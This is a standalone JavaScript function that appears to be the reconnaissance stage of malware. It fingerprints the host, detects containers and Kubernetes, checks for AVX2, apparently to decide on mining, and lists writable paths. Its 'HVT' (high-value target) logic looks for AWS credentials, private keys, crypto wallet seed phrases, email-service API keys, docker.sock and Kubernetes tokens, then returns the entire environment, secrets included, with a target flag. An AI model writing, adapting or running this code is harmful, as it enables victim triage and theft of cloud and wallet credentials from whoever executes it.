(async function() {
    const os = await import('os');
    const fs = await import('fs');
    const path = await import('path');

    // --- Helpers ---
    const read = (p) => { try { return fs.readFileSync(p, 'utf8'); } catch (e) { return ''; } };
    const exists = (p) => { try { fs.accessSync(p); return true; } catch (e) { return false; } };
    const writable = (p) => { try { fs.accessSync(p, fs.constants.W_OK); return true; } catch (e) { return false; } };
    
    // --- Data Gathering ---
    const cpus = os.cpus();
    const mem = os.totalmem();
    const platform = os.platform(); // 'linux', 'darwin', 'win32'
    
    // 1. User & Kernel
    let user = 'unknown';
    try { 
        user = os.userInfo().username; 
    } catch(e) { 
        // Fallback for restricted environments
        user = process.env.USER || process.env.USERNAME || 'unknown'; 
    }
    
    // 2. Container Detection
    let env_type = 'METAL';
    
    // Cloud/Container Environment Variables
    if (process.env.KUBERNETES_SERVICE_HOST || 
        process.env.DOCKER_HOST || 
        process.env.AWS_EXECUTION_ENV || 
        process.env.DYNO || 
        exists('/.dockerenv') ||
        exists('/run/.containerenv')) {
         env_type = 'CONTAINER';
    }

    // Linux Specific Deep Checks
    if (platform === 'linux') {
        // CGroup Logic (Self is clearer than PID 1 in some namespaces)
        const cgroup = read('/proc/self/cgroup');
        if (cgroup.match(/docker|kubepods|lxc|podman/i)) {
            env_type = 'CONTAINER';
        }
        
        // Mountinfo - OverlayFS often implies container layers
        const mounts = read('/proc/self/mountinfo');
        if (mounts.match(/overlay|overlay2/i) && env_type === 'METAL') {
            // Strong heuristic but not absolute
             env_type = 'CONTAINER (Probable)';
        }
    }

    // 3. Situational Awareness
    // Network Interfaces (Internal IPs)
    const nets = os.networkInterfaces();
    const ips = [];
    Object.keys(nets).forEach(k => {
        nets[k].forEach(n => {
            if (!n.internal && n.family === 'IPv4') ips.push(n.address);
        });
    });

    // Writable Paths Check
    // Cross-platform temp check
    const write_checks = [os.tmpdir(), '/dev/shm', '/var/tmp', process.cwd()];
    // Deduplicate (os.tmpdir might be /tmp) & filter
    const unique_checks = [...new Set(write_checks)];
    const writable_paths = unique_checks.filter(p => writable(p));

    // 4. AVX2 Check
    let has_avx2 = '0';
    // Try Node generic first
    if (cpus[0] && cpus[0].model.toUpperCase().includes('AVX2')) {
        has_avx2 = '1';
    } 
    // Linux Specific Fallback
    else if (platform === 'linux') {
        const cpuInfo = read('/proc/cpuinfo');
        if (cpuInfo.includes('avx2')) has_avx2 = '1';
    }

    // 5. HVT Logic
    const hvt_keywords = /AWS_|ECS_|EC2_|PRIVATE_KEY|MNEMONIC|WALLET|KEYSTORE|SEED_PHRASE|SENDGRID|MAILGUN|POSTMARK|SES_/i;
    const is_hvt_env = Object.keys(process.env).some(k => hvt_keywords.test(k));
    
    // Disk Checks using clean paths
    const home = os.homedir();
    const aws_creds = path.join(home, '.aws', 'credentials');
    let is_hvt_disk = exists(aws_creds);

    // Platform specific high-value paths
    if (platform === 'linux') {
        is_hvt_disk = is_hvt_disk || 
                      writable('/var/run/docker.sock') || 
                      exists('/var/run/secrets/kubernetes.io/serviceaccount/token') ||
                      exists('/root/.aws/credentials');
    }

    // --- Container Resource Limits ---
    let actual_ram_mb = Math.floor(mem / 1024 / 1024).toString();
    let actual_cores = cpus.length.toString();

    if (platform === 'linux') {
         try {
            // Memory Limits
            // v1
            let memStr = read('/sys/fs/cgroup/memory/memory.limit_in_bytes').trim();
            // v2 fallback
            if (!memStr) memStr = read('/sys/fs/cgroup/memory.max').trim();
            
            if (memStr && memStr !== 'max') {
                const bytes = parseInt(memStr);
                if (!isNaN(bytes) && bytes > 0 && bytes < mem) {
                    actual_ram_mb = Math.floor(bytes / 1024 / 1024).toString();
                }
            }

            // CPU Limits
            // v1
            const quota = parseInt(read('/sys/fs/cgroup/cpu/cpu.cfs_quota_us').trim());
            const period = parseInt(read('/sys/fs/cgroup/cpu/cpu.cfs_period_us').trim());
            
            if (!isNaN(quota) && !isNaN(period) && quota > 0) {
                actual_cores = Math.floor(quota / period).toString();
                if (actual_cores === "0") actual_cores = "0.X"; // Fractional core
                else actual_cores = Math.max(1, parseInt(actual_cores)).toString();
            } else {
                 // v2
                 const cpuMax = read('/sys/fs/cgroup/cpu.max').trim();
                 if (cpuMax) {
                     const parts = cpuMax.split(' ');
                     if (parts.length === 2 && parts[0] !== 'max') {
                         const q = parseInt(parts[0]);
                         const p = parseInt(parts[1]);
                         if (!isNaN(q) && !isNaN(p)) {
                            let c = Math.floor(q / p);
                            actual_cores = (c < 1 ? "0.X" : c).toString();
                         }
                     }
                 }
            }
         } catch(e) {}
    }

    return {
        "platform": platform,
        "user_id": user,
        "kernel_release": os.release(),
        "env_type": env_type,
        "host_cores_total": cpus.length.toString(),
        "usable_cores": actual_cores,
        "cpu_model": cpus[0] ? cpus[0].model : "unknown",
        "has_avx2": has_avx2,
        "ram_total_mb": Math.floor(mem / 1024 / 1024).toString(),
        "usable_ram_mb": actual_ram_mb,
        "ips": ips,
        "writable_paths": writable_paths,
        "cwd": process.cwd(),
        "env_vars": process.env,
        "env_vars_count": Object.keys(process.env).length.toString(),
        "is_hvt": (is_hvt_env || is_hvt_disk).toString()
    };
})();